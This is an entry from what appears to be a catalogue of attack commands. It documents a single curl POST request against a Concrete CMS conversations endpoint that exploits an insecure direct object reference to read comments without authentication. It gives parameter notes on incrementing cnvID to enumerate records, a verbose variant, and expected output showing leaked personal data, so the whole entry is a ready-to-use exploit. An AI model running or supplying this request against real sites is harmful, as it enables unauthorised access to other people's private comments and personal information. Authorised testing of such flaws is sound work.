---
data: >-
  curl -X POST
  'http://target.com/index.php/tools/required/conversations/view_ajax' -d
  'cnvID=1'
tags:
  - http
  - post
  - curl
  - web-exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.604Z'
id: 5c1de74c-3840-4872-91d6-6096dd5a59bd
verified: false
validated: true
submitted: true
---
# curl-post-conversations-view

## Command

```bash
curl -X POST 'http://target.com/index.php/tools/required/conversations/view_ajax' -d 'cnvID=1'
```

## Description

This command sends a POST request to the Concrete CMS conversations view endpoint using curl, specifying a cnvID parameter to retrieve comment data. It is used to test and exploit the IDOR vulnerability by accessing conversations without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'http://target.com/index.php/tools/required/conversations/view_ajax'` | The vulnerable endpoint URL (replace target.com with actual host) | Yes |
| `-d 'cnvID=1'` | POST data with the conversation ID (increment for enumeration) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/index.php/tools/required/conversations/view_ajax' -d 'cnvID=1'
```

### Advanced Usage

```bash
curl -X POST 'http://target.com/index.php/tools/required/conversations/view_ajax' -d 'cnvID=1' -H 'Content-Type: application/x-www-form-urlencoded' --verbose
```

## Expected Output

Successful execution returns the comment content in JSON or HTML format, e.g., a response body containing {"cnvID":1, "comment":"Sensitive PII data"}. Errors may occur for invalid cnvIDs, but valid ones disclose restricted data without auth.

## Related

- [[Related Procedure: Access-Conversation-via-IDOR-as-Unauthenticated-User]]
- [[Related Procedure: Enumerate-Comments-by-Brute-Forcing-cnvID]]
